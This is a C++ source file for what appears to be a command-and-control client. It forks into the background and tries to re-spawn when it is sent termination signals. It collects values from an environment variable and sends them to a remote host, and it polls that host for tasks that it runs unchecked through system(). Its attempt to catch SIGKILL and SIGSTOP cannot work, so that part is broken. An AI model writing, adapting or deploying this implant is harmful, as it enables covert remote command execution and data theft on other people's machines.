
#ifndef FUNCTIONS_CPP
#define FUNCTIONS_CPP

#include "header.h"
#include "linkedList.cpp"

const char* DEFAULT_SHELL_VARIABLE = "imdd";

LinkedList<std::string> mDatabase;

void processArguments(int &argc, char *argv[])
{
	printf("Processing program arguments now...\n");

	if(argc < 3)
	{
		printError("Error: host address and port number must be defined.\n");
	}

	char *inetAddress = argv[1];
        int portNumber    = atoi(argv[2]);

	if(argc == 3)
	{
		run(portNumber, inetAddress);
		exit(0);
	}

        for(int i = 3; i < argc; i++)
	{
		std::string argument = std::string(argv[i]);

		if(argument == READ_BINARY_FILE)
		{
			i++;
			
			if(i < argc)
			{
				readBinaryFile(portNumber, inetAddress, std::string(argv[i]));
			}
		}
		else if(argument == EXECUTE_NEW_TASK)
		{
			i++;

			if(i < argc)
			{
				executeTask(std::string(argv[i]));
			}
		}
	}

	printf("Done processing arguments.\n");
}


void initializeClientID()
{
	if(isFileExist(CLIENT_ID_FILENAME) == false)
	{
		if(createClientIDFile() < 0)
			exit(1);
		else
			if(readClientIDFile() < 0)
				exit(1);
	}
	else
	{
		if(readClientIDFile() < 0)
			exit(1);
	}
}


void getEnvironmentVariable(std::string &currentValue)
{
	//printf("Getting environment variable...\n");

	char* value;
	value = getenv(DEFAULT_SHELL_VARIABLE);
	
	if(value != NULL)
	{
		if(strlen(value) > 0)
		{
			currentValue = std::string(value);
		}
		else
		{
			currentValue = "";
		}
	}
	
	//printf("Done getting environment variable.\n");
}


void resetEnvironmentVariable()
{
	//printf("Resetting environment variable...\n");

	std::string newVariable = std::string(DEFAULT_SHELL_VARIABLE);
	newVariable += "=";

	char* value = strdup(newVariable.c_str());
	putenv(value);
	free(value);

	//printf("Done resetting variable.\n");
}


void sleep()
{
	struct timespec time1, time2;

   	time1.tv_sec  = 0;
   	time1.tv_nsec = (long) DAEMON_SLEEP_NANOSECONDS;

   	if(nanosleep(&time1, &time2) < 0)   
   	{
      		printError("Error: nano sleep system call failed.");
   	}
}


void setupBackgroundProcess()
{
	/*if((chdir("/")) < 0) 
	{
                exit(EXIT_FAILURE);
	}*/

        //close(STDIN_FILENO);
        //close(STDOUT_FILENO);
        //close(STDERR_FILENO);

	signal(SIGTERM, signalHandler);
	signal(SIGKILL, signalHandler);
	signal(SIGSTOP, signalHandler);
}


void createBackgroundProcess()
{
	pid_t pid, sid;
        
        pid = fork();

        if(pid == -1)
	{
                exit(EXIT_FAILURE);
        }
	else if(pid != 0)
	{
		exit(EXIT_SUCCESS);
	}

        sid = setsid();

        if(sid == -1)
	{
                exit(EXIT_FAILURE);
        }

	setupBackgroundProcess();
}


void signalHandler(int signalID)
{
	switch(signalID)
	{
		case SIGTERM:
			createBackgroundProcess();

			break;
		case SIGKILL:
			createBackgroundProcess();

			break;
		case SIGSTOP:
			createBackgroundProcess();

			break;
		default:
			;
	}
}


void run(int port, char* inetAddress)
{
	printf("Client now running in background...\n");

	mDatabase = LinkedList<std::string>();
	
	std::string variableData;
	int nextJobCheckIn = 0;

	while(true) 
	{
 		getEnvironmentVariable(variableData);
		resetEnvironmentVariable();

		if(variableData.length() > 0)
		{
			printf("Adding new information to database.\n");

			mDatabase.insert(variableData);
			variableData = "";

			if(mDatabase.getCount() == DATABASE_ENTRY_CAPACITY)
			{
				sendDatabaseContents(port, inetAddress);
			}
		}

		if(nextJobCheckIn == JOB_CHECKIN_DECISECONDS)
		{
			checkInToServer(port, inetAddress);
			nextJobCheckIn = 0;
		}
		else
		{
			nextJobCheckIn++;
		}

		sleep();
        }

	printf("Client has stopped running in background.\n");
}


void sendDatabaseContents(int &port, char* inetAddress)
{
	for(int i = 0; i < mDatabase.getCount(); i++)
	{
		sendStringData(port, inetAddress, mDatabase.getData(i));
	}

	mDatabase.clear();
}


void checkInToServer(int &port, char* inetAddress)
{
	std::string nextTask;

	char* clientID = strdup(mClientID.c_str());
	receiveNextTask(port, inetAddress, clientID, nextTask);
	free(clientID);

	executeTask(nextTask);
}


int executeTask(std::string taskName)
{
	int executionResult = system(taskName.c_str());

	return executionResult;
}

#endif
